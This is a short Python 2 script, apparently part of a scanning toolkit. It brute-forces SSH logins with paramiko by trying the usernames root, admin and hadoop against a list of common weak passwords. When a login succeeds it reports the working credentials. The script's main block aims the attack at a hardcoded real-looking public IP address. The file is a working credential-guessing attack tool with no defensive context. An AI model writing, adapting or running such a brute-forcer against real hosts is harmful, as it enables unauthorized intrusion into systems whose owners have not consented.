#-*- coding: utf-8 -*-
#!/usr/bin/python 
import paramiko

def ssh2(ip='',port='22',name='',productname=''):
    head=''
    ans=None
    keywords=''
    hackinfo=''

    ssh=None
    userlist=['root','admin','hadoop']
    passwd=['root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','696969',
            'abc123','qwerty','oracle','hadoop']
    msg='1'
    for  username in  userlist:
        for i in passwd:
            try:
	    	# 创建SSH对象
                ssh = paramiko.SSHClient()
    		# 允许连接不在know_hosts文件中的主机
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print ("username:%s password:%s"%(username, i))
		# 连接服务器
                ssh.connect(ip,int(port),username,i,timeout=10)

                hackinfo= ' ssh the password is :'+username+':'+i
                print ip+hackinfo
                keywords='ssh'
                break
            except Exception,e:
                keywords='ssh'
                hackinfo=str(e)
                print "Exception:", e[0]
                if e[0] is None:
                    msg=None
                    break
                if e[0]==111:
                    hackinfo=str(e)
                    keywords='ssh'
                    print ip+'  key is not '+i
                    continue
                if e[0]==113:
                    hackinfo=str(e)
                    keywords=' '
                    break
                if e[0] in 'Authentication failed.':
                    continue
                else:
                    msg = None
                    break
            finally:
                if ssh !=None:
                    ssh.close()
            continue
        if 'password' in hackinfo or msg is None:
            break
    return head,ans,keywords,hackinfo

if __name__ == "__main__":
    temp=ssh2('219.232.193.125')
    print temp

